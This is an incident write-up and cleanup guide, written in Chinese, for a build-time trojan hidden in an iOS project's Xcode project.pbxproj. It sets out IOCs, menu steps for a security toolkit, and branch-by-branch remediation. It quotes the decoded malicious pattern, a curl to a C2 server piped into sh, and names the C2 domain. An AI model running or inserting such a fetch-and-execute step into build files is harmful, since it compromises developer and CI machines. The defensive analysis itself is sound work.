# Xcode 构建期木马问题简述与处理方案（2026-10）

## 问题是什么

多人协作的 iOS 工程（如 ResmartHealth）中，`project.pbxproj` 被写入伪装的 **Run Script Build Phase** 和混淆的 **Build Setting**。用 Xcode 编译时，会后台从境外服务器下载脚本并用 `sh` 执行，属于**构建期供应链木马**，主要威胁开发机 / 打包机，而非 App 业务代码本身。

典型形态：

- 伪装阶段名（如 `Provision Library Executable`）→ `sh -c "${A3EA261}"`
- Setting 用 `printf|tr` 拼出 `xxd`，再 hex 解码成：`curl … -d "p=xcode_phase" <C2> | sh`

旧清理脚本只认固定变量名和明文 `xxd`/`curl`，**漏检**了该混淆变种。toolkit 已改为按**行为特征**检测并清理。

更完整记录见：`XCODE_PBXPROJ_INCIDENT_2026-10.md`。

---

## 解决方案（怎么做）

工具目录：`~/Desktop/mac-setup-security-toolkit`，入口：`./start.sh`

| 步骤 | 做什么 |
|------|--------|
| 1. 本机 | 关 Xcode → 菜单 **9** 检查 → 有问题则 **10**（必要时 **11**）→ 再 9 直到 clean |
| 2. 打包机 | 停构建 → 优先 **11** → 裁剪无用分支 → **逐个在用分支** checkout → clean → **commit + push** |
| 3. 团队 | 以打包机推送的干净 tip 为源；本机 `check` 干净后删旧 clone，再重新拉代码；`git fetch --prune` |
| 4. 防复发 | `pbxproj` 清理单独提交；合并前对 `project.pbxproj` 做 IOC 扫描门禁 |

**重要范围：** 脚本只清**当前工作区**磁盘上的文件，**不会**自动清所有 Git 分支。只清本机不 push，或只删本地仓不清本机/打包机持久化，问题仍会复发。

菜单含义：

- **9**：只读检查  
- **10**：清理用户/项目（含工作区 `pbxproj`）  
- **11**：在 10 基础上再清系统级持久化（需 sudo）

---

## 备注：重要缩写

| 缩写 | 全称 | 含义 |
|------|------|------|
| **IOC** | Indicator of Compromise（失陷指标） | 用来判断是否中招的特征，如恶意 Setting 名、`printf\|tr` 混淆片段、`p=xcode_phase`、已知恶意域名等。脚本靠匹配 IOC 发现并清理。 |
| **C2** | Command and Control（命令与控制，亦作 C&C） | 攻击者远程指挥木马的服务器/通道。本事件中解码出的 `https://jhqt34n3qreu.ru/a` 即为 C2：编译时 curl 拉脚本再执行。 |
| **pbxproj** | Xcode 工程文件 `project.pbxproj` | 描述 Target、Build Phase、Build Setting 等；本次木马藏在此文件的 Run Script 与自定义 Setting 里。 |
| **tip** | 分支当前最新提交 | 「分支 tip 干净」= 该分支最新 commit 已无恶意内容；历史旧 commit 仍可能带毒。 |
| **checkout** | 检出某分支到工作区 | 切到带毒分支会把恶意 `pbxproj` 再次写到磁盘，所以要逐分支清理并提交。 |
| **CI** | Continuous Integration（持续集成） | 公共打包/自动构建环境；带毒工程在 CI 上编译同样会触发载荷，清理期间应暂停构建。 |

一句话：**IOC 是怎么认出中招，C2 是木马听谁指挥。**
